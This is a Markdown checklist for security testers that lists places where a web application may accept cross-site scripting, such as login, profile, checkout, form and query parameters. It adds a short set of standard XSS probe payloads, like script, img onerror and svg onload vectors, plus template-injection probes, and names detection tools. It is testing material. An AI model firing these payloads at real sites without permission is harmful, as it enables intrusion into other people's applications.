
## Purpose:
This checklist helps you identify potential XSS injection points across different components of a web application, including input fields, headers, URLs, and APIs.

---

## Authentication & Session Handling
- [ ] `/login?user=<xss>`
- [ ] `/register?email=<xss>`
- [ ] `/2fa/setup?phone=<xss>`
- [ ] `/reset-password?token=<xss>`
- [ ] `/change-password?success=<xss>`
- [ ] Hidden form fields like `csrf_token=<xss>`
- [ ] OAuth redirect: `/auth/callback?redirect_uri=<xss>`
- [ ] Magic link email param: `/login?magic=<xss>`
- [ ] Email verification link with `?email=<xss>`
- [ ] POST body param: `username=<xss>&password=123`

---

## Profile & User Management
- [ ] `/profile?user_id=<xss>`
- [ ] `?name=<xss>` in profile name update
- [ ] `bio=<xss>` in rich text bio fields
- [ ] `avatar_url=<xss>` in image src
- [ ] `location=<xss>` in user metadata
- [ ] `occupation=<xss>` in job titles
- [ ] `status=<xss>` in status messages
- [ ] `/settings?tab=<xss>` tab param in settings page
- [ ] `gender=<xss>` dropdown
- [ ] `birthdate=<xss>` if displayed in JS

---

## E-Commerce / Transactional
- [ ] `product_id=<xss>` in product preview
- [ ] `category=<xss>` in product filtering
- [ ] `search=<xss>` in search results
- [ ] `coupon_code=<xss>` in checkout
- [ ] `qty=<xss>` in cart update
- [ ] `comments=<xss>` in review forms
- [ ] `tracking_id=<xss>` in order tracking
- [ ] `delivery_address=<xss>` if echoed
- [ ] `gift_message=<xss>` in order confirmation
- [ ] `wishlist_name=<xss>` in saved lists

---

## Communication / Forms
- [ ] `contact_message=<xss>` in contact forms
- [ ] `feedback=<xss>` in feedback form
- [ ] `subject=<xss>` in support tickets
- [ ] `file_name=<xss>` in upload previews
- [ ] `chat_message=<xss>` in real-time chat
- [ ] `description=<xss>` in issue trackers
- [ ] `title=<xss>` in blog/forum posts
- [ ] `reply=<xss>` in comment sections
- [ ] `answer=<xss>` in Q&A forums
- [ ] `report_reason=<xss>` in abuse reporting

---

## URL/Query-Based Insertion
- [ ] `?redirect=<xss>` on redirects
- [ ] `?return_url=<xss>` on login/logout
- [ ] `?error=<xss>` on error pages
- [ ] `?success=<xss>` on form completion
- [ ] `?preview=<xss>` on preview features
- [ ] `?mode=<xss>` on toggling UI modes
- [ ] `?lang=<xss>` on localization
- [ ] `?tab=<xss>` in tabbed navigation
- [ ] `?view=<xss>` in dashboards
- [ ] `?callback=<xss>` in JSONP endpoints

---

## Bonus Insertion Patterns
- [ ] `<script>alert(1)</script>` basic payload
- [ ] `"><img src=x onerror=alert(1)>` classic image vector
- [ ] `<svg/onload=alert(1)>` SVG attack vector
- [ ] `<iframe src="javascript:alert(1)">` iframe trick
- [ ] `<body onload=alert(1)>` onload attribute abuse
- [ ] `javascript:alert(1)` in href/src
- [ ] `</textarea><script>alert(1)</script>` closing tag injection
- [ ] Template injection: `{{7*7}}`
- [ ] JSON-based: `{"name":"<xss>"}` in REST API POST
- [ ] WebSocket echo server reflecting data

---

## Tools for Detection
- [ ] Burp Suite + Turbo Intruder
- [ ] XSStrike
- [ ] Dalfox
- [ ] XSS Hunter / Interactsh
- [ ] Google Chrome DevTools (DOM breakpoints)

---
